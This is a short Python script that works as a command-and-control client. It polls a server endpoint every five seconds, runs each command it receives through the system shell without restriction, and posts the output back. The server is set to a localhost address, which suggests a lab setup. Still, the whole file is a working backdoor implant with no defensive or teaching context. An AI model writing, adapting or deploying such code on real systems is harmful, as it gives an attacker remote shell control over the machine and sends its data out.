import requests
import subprocess
import time

# Endpoints on the server
COMMAND_ENDPOINT = 'http://127.0.0.1:5001/get_command'
OUTPUT_ENDPOINT = 'http://127.0.0.1:5001/output'

def execute_command(command):
    try:
        # Execute the received command using subprocess
        result = subprocess.run(
            command,
            shell=True,
            check=True,  # Raise an exception for non-zero return codes
            text=True,
            capture_output=True  # Capture both stdout and stderr
        )
        return result.stdout
    except subprocess.CalledProcessError as e:
        # Handle non-zero return codes (command execution errors)
        error_message = f"Error executing command: {e}\n"
        if hasattr(e, 'stderr') and e.stderr is not None:
            error_message += f"{e.stderr}\n"
        return error_message
    except Exception as e:
        return f"Error executing command: {e}"

def send_output(output):
    try:
        # Send the output back to the server
        requests.post(OUTPUT_ENDPOINT, data={'output': output})
    except requests.exceptions.RequestException as e:
        print(f"Request Error: {e}")

if __name__ == '__main__':
    while True:
        try:
            # Request command from the server
            response = requests.get(COMMAND_ENDPOINT)
            data = response.json()
            command_to_execute = data.get('command', '')

            if command_to_execute:
                print(f"Received Command: {command_to_execute}")
                output = execute_command(command_to_execute)
                print(f"Command Output:\n{output}")

                # Send the output back to the server immediately
                send_output(output)

        except requests.exceptions.RequestException as e:
            print(f"Request Error: {e}")

        time.sleep(5)  # Poll every 5 seconds
